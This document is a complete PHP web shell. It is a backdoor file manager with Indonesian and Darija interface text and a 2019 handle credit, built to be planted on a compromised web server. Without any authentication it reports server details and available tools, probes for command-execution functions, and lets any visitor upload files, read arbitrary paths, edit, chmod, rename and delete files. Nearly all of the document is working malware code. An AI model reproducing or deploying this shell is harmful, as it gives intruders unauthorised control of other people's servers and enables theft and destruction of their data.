<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
function hdd($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f',$s / 1073741824 ).' GB';
		elseif($s >= 1048576)
		return sprintf('%1.2f',$s / 1048576 ) .' MB';
		elseif($s >= 1024)
		return sprintf('%1.2f',$s / 1024 ) .' KB';
		else
		return $s .' B';
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=#ea3233>ON</font>" : "<font>OFF</font>";
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=#ea3233>$ds</font>" : "<font color=#6fcb9f>NONE</font>";
$mysql = (function_exists('mysql_connect')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#ea3233>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#ea3233>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#ea3233>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#ea3233>OFF</font>";
$python = (exe('python --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#ea3233>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
	$_POST[$key] = stripslashes($value);
	}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Electrolize" rel="stylesheet" type="text/css">
<style>
* {
 	font-family: Electrolize, sans-serif;
}
 	body { 
    background-color: black;
    background-size: 100%;
    background-repeat:no-repeat;
    margin: 0px;
 	font-family: "Electrolize", sans-serif; cursive;color:#fff;
 	font-size: 13px;
}
hr {
	background-color: #ea3233; height: 1px; border: 0; 
}
a { 
 	text-decoration:none; color:#ffe28a; cursor: auto;} a:hover{
 	border-bottom-width: 1px;
 	border-bottom-style: solid;
 	border-bottom-color: #ffffff;
}
tbody {
 	display: table-row-group;
 	vertical-align: middle;
 	border-color: inherit;
}
table {
 	white-space: normal;
 	line-height: normal;
 	font-weight: normal;
 	font-style: normal;
 	color: -internal-quirk-inherit;
 	text-align: start;
 	font-variant: normal normal;
}
table {
 	display: table;
 	border-collapse: separate;
 	border-spacing: 2px;
 	border-color: grey;
}
tr {
 	display: table-row;
 	vertical-align: inherit;
 	border-color: inherit;
}
td, th {
 	display: table-cell;
 	vertical-align: inherit;
}
.content{ 
 	width:100%; text-decoration:none; color:#ffe28a;  
} 
a { 
    -webkit-transition:all .4s ease-in-out;-moz-transition:all .4s ease-in-out;-o-transition:all .4s ease-in-out;-ms-transition:all .4s ease-in-out;transition:all .4s ease-in-out text-decoration:none; 
} 
.content a:link {
 	text-decoration: none;
}
.content a:visited { 
}
.content a:hover {
 	background: #ffe28a; color: black; 
}
.content td{ 
 	padding:0 8px; line-height:24px; 
} 
.content th{ 
 	background: #191919; padding:3px 8px; font-weight:normal; 
} 
.content tr:hover{
 	cursor:pointer;
 	background-color: #111111;
}
input[type=submit]{ 
 	background:#000000; 
 	color:#ffe28a; 
 	margin:0 4px; 
 	font-size:13px; 
 	border:1px solid #444444; 
 	cursor:pointer;
 	-moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    -khtml-border-radius: 5px;
} 
input[type=submit]:hover{ 
 	border-bottom:1px solid #ffffff;
 	font-size:13px; 
 	border-top:1px solid #ffffff; 
}
input[type=text], option, select {
 	background:#000000; 
 	border:0; 
 	padding:2px; 
 	border-bottom:1px solid #393939;
 	color:#ffe28a;
}
textarea {
 	margin:auto;
 	border:1px solid #333333;
 	width:100%;
 	height:400px;
 	background:#000000;
 	color:#ffe28a;
 	padding:0 2px;
 	font-size:12px;
}
</style>

</HEAD>
<BODY>
<br/>
System : <font color=#ffe28a>'.php_uname().'</font><br>
User : <font color=#ffe28a>'.$user.'</font> ('.$uid.') Group : <font color=#ffe28a>'.$group.'</font> ('.$gid.')<br>
Server IP : <font color=#ffe28a>'.gethostbyname($_SERVER['HTTP_HOST']).'</font> | Your IP : <font color=#ffe28a>'.$_SERVER['REMOTE_ADDR'].'</font><br>
HDD : <font color=#ffe28a>'.$used.'</font> / <font color=#ffe28a>'.$total.'</font> ( Free : <font color=#ffe28a>'.$freespace.'</font> )<br>
Safe Mode : <font color=#ffe28a>'.$sm.'</font><br>
Time On Server : <font color=#ffe28a>'.date('d M Y H:m').'</font><br>
Disable Functions : <font color=#ffe28a>'.$show_ds.'</font><br>
MySQL : '.$mysql.' | Perl : '.$perl.' | Python : '.$python.' | WGET : '.$wget.' | CURL : '.$curl.'<br>
<tr><td>Current Path : ';
if(isset($_GET['path'])){
	$path = $_GET['path'];
		} else {
	$path = getcwd();
	}
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
	$a = true;
	echo '<a href="?path=/">/</a>';
	continue;
	}
if($pat == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$paths[$i]";
if($i != $id) echo "/";
	}
	echo '">'.$pat.'</a>/';
	}
	echo '</td>
	</tr>
	<tr>
	<td>';
	echo '<div align="center"';
	echo '<tr><form enctype="multipart/form-data" method="POST">
	Upload File : <input type="file" name="file" />
	<input type="submit" value=">" />
	</form>
	</td></tr></div>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
	echo '<div align="center"><font color="#6fcb9f">Upload File Selesai.</font><br />';
	} else {
	echo 'font color="#FF0000">Upload File Gagal.</font><br /></div>';
	}
	}
if(isset($_GET['filesrc'])){
	echo "<tr><td>";
	echo '</tr></td></table><br />';
	echo "<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br />";
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
	echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
	echo '<font color="#6fcb9f">Perubahan Izin Selesai.</font><br />';
	} else {
	echo '<font color="#ea3233">Perubahan Izin Gagal.</font><br />';
	}
	}
	echo '<form method="POST">
	Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="chmod">
	<input type="submit" value=">" />
	</form>';
	} elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
	echo '<font color="#6fcb9f">Ganti Nama Selesai.</font><br />';
	} else {
	echo '<font color="#ea3233">Ganti Nama Gagal.</font><br />';
	}
	$_POST['name'] = $_POST['newname'];
	}
	echo '<form method="POST">
	New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="rename">
	<input type="submit" value=">" />
	</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
	$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
	echo '<font color="#6fcb9f">Edit File Selesai.</font><br />';
	} else {
	echo '<font color="#ea3233">Edit File Gagal.</font><br />';
	}
	fclose($fp);
	}
	echo '<form method="POST">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="opt" value="edit">
	<input type="submit" value=">" />
	</form>';
	}
	echo '</center>';
	} else {
	echo '</table><br /><center>';
	if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
	if($_POST['type'] == 'dir'){
	if(rmdir($_POST['path'])){
	echo '<font color="#6fcb9f">Hapus Dir Selesai.</font><br />';
	} else {
	echo '<font color="#ea3233">Hapus Dir Gagal.</font><br />';
	}
	} elseif($_POST['type'] == 'file'){
	if(unlink($_POST['path'])){
	echo '<font color="#6fcb9f">Hapus Berkas Selesai.</font><br />';
	} else {
	echo '<font color="#ea3233">Hapus Berkas Gagal.</font><br />';
	}
	}
 }
	echo '</center>';
	$scandir = scandir($path);
	echo '<div><table width="700" class="content" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<th><center>Nama</center></th>
	<th><center>Ukuran</center></th>
	<th><center>Hak Akses</center></th>
	<th><center>Pilihan</center></th>
	</tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $path == '.' || $path == '..') continue;
if($dir === '..') {
	$href = "<a href='?path=".dirname($path)."'>$dir</a>";
 		} elseif($dir === '.') {
 	$href = "<a href='?path=$path'>$dir</a>";
 		} else {
 	$href = "<a href='?path=$path/$dir'>$dir</a>";
 		}
	echo "<tr>
	<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg=='> $href</td>
	<td><center>--</center></td>
	<td><center>";
if(is_writable("$path/$dir")) echo '<font color="#6fcb9f">';
elseif(!is_readable("$path/$dir")) echo '<font color="#ea3233">';
	echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select name=\"opt\">
	<option value=\"\"></option>
	<option value=\"delete\">Msa7</option>
	<option value=\"chmod\">Chmodi</option>
	<option value=\"rename\">Samya</option>
	<option value=\"edit\">modifi</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
	<input type=\"submit\" value=\">\" />
	</form></center></td>
	</tr>";
	}
	echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
	$size = filesize("$path/$file")/1024;
	$size = round($size,3);
if($size >= 1024){
	$size = round($size/1024,2).' MB';
	} else {
	$size = $size.' KB';
	}
	echo "<tr>
	<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
	<td><center>".$size."</center></td>
	<td><center>";
if(is_writable("$path/$file")) echo '<font color="#6fcb9f">';
elseif(!is_readable("$path/$file")) echo '<font color="#ea3233">';
	echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select name=\"opt\">
	<option value=\"\"></option>
	<option value=\"delete\">Msa7</option>
	<option value=\"chmod\">chmodi</option>
	<option value=\"rename\">samya</option>
	<option value=\"edit\">3dal</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"file\">
	<input type=\"hidden\" name=\"name\" value=\"$file\">
	<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
	<input type=\"submit\" value=\">\" />
	</form></center></td>
	</tr>";
	}
	echo '</table>
	</div>';
	}
	echo '<br />
	</BODY>
	</HTML>';
function perms($file){
	$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
	$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
	$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
	$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
	$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
	$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
	$info = 'p';
} else {
// Unknown
	$info = 'u';
}
// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));

// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));

// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
	}
?>
<hr>
<center>
<font style="color:#fffeb3;font-size:14px;font-family:Electrolize;text-shadow: 1px 1px 2px #000000, 1px 1px 2px #000000, 1px 1px 2px #000000">
Copyright &copy; 2019 HisHow0KiNg .
</font>
</center>
</hr>